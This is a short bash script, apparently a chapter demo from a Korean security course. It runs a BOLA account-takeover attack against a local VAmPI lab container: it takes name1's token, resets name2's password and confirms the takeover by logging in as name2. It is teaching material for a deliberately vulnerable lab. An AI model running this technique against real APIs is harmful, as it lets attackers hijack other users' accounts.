#!/usr/bin/env bash
# 11장 BOLA 데모 — name1 토큰으로 name2 계정을 탈취한다.
# 대상은 본인의 로컬 VAmPI 컨테이너뿐이다.
set -euo pipefail
B=${1:-http://127.0.0.1:5005}

echo "[*] DB 초기화"
curl -s "$B/createdb" >/dev/null

echo "[*] name1 로 로그인해 토큰 확보"
TOK=$(curl -s -X POST "$B/users/v1/login" -H 'Content-Type: application/json' \
      -d '{"username":"name1","password":"pass1"}' | jq -r '.auth_token')
echo "    token len=${#TOK}"

echo "[*] BOLA: name1 토큰으로 name2 의 비밀번호를 바꾼다"
code=$(curl -s -o /dev/null -w '%{http_code}' -X PUT "$B/users/v1/name2/password" \
       -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
       -d '{"password":"hacked"}')
echo "    HTTP $code (204 면 변경 성공)"

echo "[*] 탈취 확인: name2 를 새 비밀번호로 로그인"
ok=$(curl -s -X POST "$B/users/v1/login" -H 'Content-Type: application/json' \
     -d '{"username":"name2","password":"hacked"}' | jq -r '.message')
echo "    → $ok"

echo "[+] BOLA 확인됨: 권한 검사가 path 의 username 을 무시한다"
